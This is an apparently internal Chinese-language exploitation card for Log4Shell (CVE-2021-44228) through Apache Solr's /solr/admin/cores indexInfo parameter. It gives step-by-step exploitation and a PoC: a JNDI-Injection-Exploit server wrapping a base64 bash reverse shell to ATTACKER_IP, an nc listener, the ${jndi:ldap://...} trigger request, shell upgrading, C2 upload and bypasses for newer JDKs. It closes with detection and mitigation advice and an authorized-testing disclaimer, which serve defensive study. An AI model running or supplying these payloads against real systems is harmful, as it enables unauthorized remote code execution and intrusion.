---
id: web-java-deserialization-jndi-solr-cores-indexinfo-log4j2-rce
title: Apache Solr admin/cores 的 indexInfo 参数写入日志触发 Log4j2 JNDI 注入 RCE（CVE-2021-44228）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: solr-admin-cores-indexinfo-log4j2-jndi
tags:
- solr
- log4j2
- jndi
- ldap
- rce
- cve-2021-44228
- solr-admin
- log4shell
cve:
- CVE-2021-44228
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V608
  verified_at: '2026-11-12T19:33:49+08:00'
  notes: 已对照原文与全部61张截图核对：图36-39 显示 fscan 发现 8983、Solr 8.11.0 面板、JNDI-Injection-Exploit base64 反弹命令、/solr/admin/cores?wt=json&indexInfo=${jndi:ldap://...} 请求及 solr 用户回连，均与卡一致；CVE-2021-44228 与 indexInfo 进日志触发 log4j2 JNDI 的手法相符；原文未明确给出受影响版本区间，affected_versions 保持为空未猜测；PoC 为结构化泛化复现，未本机执行。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-solr-cores-indexinfo-log4j2-rce/
draft: false
kb_aliases:
- Solr Log4j2 RCE
- Solr log4shell
- /solr/admin/cores indexInfo
- indexInfo JNDI
- Solr Admin 未授权
- Apache Solr 8.11.0 Log4j2
---

## 一句话结论

暴露的 Apache Solr 管理端（如 8.11.0）若内置受影响的 Log4j2，访问 `/solr/admin/cores?indexInfo=${jndi:ldap://ATTACKER:1389/x}` 时该参数被 CoreAdminHandler 写入日志，Log4j2 对 `${jndi:...}` 求值并回连攻击者 LDAP 服务，加载远程类后以 Solr 进程身份执行命令，直接获得 `solr` 用户 Shell。

## 原理

- Log4j2 在输出日志消息时会对 `${...}` 做 Lookup 求值，其中 `jndi` lookup 会按名称访问 JNDI 资源；CVE-2021-44228 允许把攻击者控制的 JNDI 名称交给该求值器。
- Solr 的 CoreAdminHandler 处理 `/solr/admin/cores` 请求时，会把客户端传入的 `indexInfo` 参数值写进日志（`log.info("indexInfo: " + indexInfo)` 一类调用）。参数值未做 `${jndi:...}` 转义即进入 Log4j2 消息，触发 JNDI 查询。
- 攻击者的 LDAP 服务返回带远程 codebase 的 `ResourceRef`（如 JNDI-Injection-Exploit 生成的模板类），目标 JVM 从攻击者 HTTP 服务拉取字节码并实例化，静态初始化或工厂方法中执行命令。
- 为什么成立：Solr 管理端默认常无认证或弱认证，`indexInfo` 是最容易被日志记录的请求参数之一；Log4j2 的 Lookup 求值发生在日志格式化阶段，处理请求时立即可达；JVM 若能出站访问攻击者 LDAP/HTTP，即完成远程类加载。
- 高版本 JDK 默认关闭 `com.sun.jndi.ldap.object.trustURLCodebase`，远程 codebase 可能被拒绝；此时需要目标 classpath 上的本地 gadget、反序列化二次利用或 EL/BeanFactory 类绕过，原环境（Solr 8.11.0）实测可直接回连。

## 触发条件

- 目标运行使用受影响 Log4j2（2.0-beta9 至 2.14.1）的 Solr，管理端端口（默认 8983）可达。
- `/solr/admin/cores` 未被认证/网络策略隔离，攻击者能提交 `indexInfo` 参数。
- 目标 JVM 可出站访问攻击者 LDAP（1389）与 HTTP 服务，或可使用内网可控服务。
- JDK 允许远程 codebase，或存在可利用的本地 gadget。
- 命令执行权限为 Solr 进程用户；原环境为 `solr` 普通用户，需再做本地提权。

## 利用步骤

1. 端口与指纹：`fscan`/`nmap` 发现 8983，访问 `http://TARGET:8983/solr/` 确认 Solr Admin 与版本（原环境面板显示 8.11.0）。
2. 在可被目标访问的 VPS 启动 JNDI 利用服务，命令载荷用 Base64 包装的反弹 Shell：
   `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,<base64>}|{base64,-d}|{bash,-i}" -A ATTACKER_IP`
   工具会输出可用的 LDAP 地址（如 `ldap://ATTACKER_IP:1389/xxxx`）。
3. 攻击机监听反弹端口（原文 `nc -lvnp 6666`）。
4. 触发求值：请求 `/solr/admin/cores?wt=json&indexInfo=${jndi:ldap://ATTACKER_IP:1389/xxxx}`，响应正常返回 `status:0` 即说明参数已被处理。
5. 监听端收到回连，`whoami` 确认为 `solr`；用 `python -c 'import pty; pty.spawn("/bin/bash")'` 建立伪终端，再上传 Viper/其他 C2 或手工继续收集与提权。

## PoC

```bash
# 1. 指纹：确认 Solr 管理端与版本
curl -s 'http://TARGET:8983/solr/' | grep -oi 'Solr [0-9.]*'

# 2. 攻击者 VPS：JNDI 注入服务（命令为 Base64 包装的反弹 Shell）
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C 'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}' \
  -A ATTACKER_IP

# 3. 攻击机监听
nc -lvnp 6666

# 4. 触发 indexInfo 日志求值
curl 'http://TARGET:8983/solr/admin/cores?wt=json&indexInfo=${jndi:ldap://ATTACKER_IP:1389/xxxx}'
```

说明：PoC 为原文流程的结构化复现，IP/域名/端口已泛化，未在本机执行；仅用于授权测试。

## 变体与关联

- 变体：Solr 其他会把请求参数/异常写入日志的入口（如 `action`、`name`、查询参数、UA/Header）同样可触发；先用 DNSLog 做 `${jndi:dns://...}` 外带验证最稳妥。
- 变体：高版本 JDK 不能远程加载时，改用 JNDI 本地 gadget、`BeanFactory`+ELProcessor、二次反序列化链，或利用 Solr 自身已知漏洞（如 CVE-2023-50386 配置集写入）。
- 关联：[[web-java-deserialization-jndi-log4j2-login-rce]]（登录参数触发 Log4j2 JNDI）、[[web-java-framework-symphony-article-type-log4j2-jndi-rce]]（产品参数进 WARN 日志的同类入口）、[[web-java-deserialization-jndi-high-version-beanfactory-el]]（高版本 JDK 绕过）。
- 边界：Solr 已升级到修复 Log4j2 的版本（8.11.1+ 或已替换 log4j-core）、管理端被认证/网络隔离、目标不能出站访问攻击者服务、JDK 禁止远程 codebase 且无本地 gadget 时，本链不成立。

## 检测与防御

- 检测：请求参数/Header 中出现 `${jndi:`、`ldap://`、`rmi://`；Solr 进程发起 1389/1099 出站连接；Solr 日志出现 `JndiLookup`、`javax.naming` 异常；JVM 加载陌生远程类或临时目录出现异常 class/jar。
- 修复：升级 Solr 至已修复 Log4j2 的版本（同时升级 log4j-core 到 2.17.0+）；无法升级时移除 `JndiLookup` 类、设置 `log4j2.formatMsgNoLookups=true` 或 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`。
- 缓解：限制 JVM 出站 LDAP/RMI/DNS，仅允许必要目标；为 Solr 管理端加认证与网络 ACL；WAF 拦截 `${jndi:` 特征；以低权限用户运行 Solr，降低 RCE 后的影响。
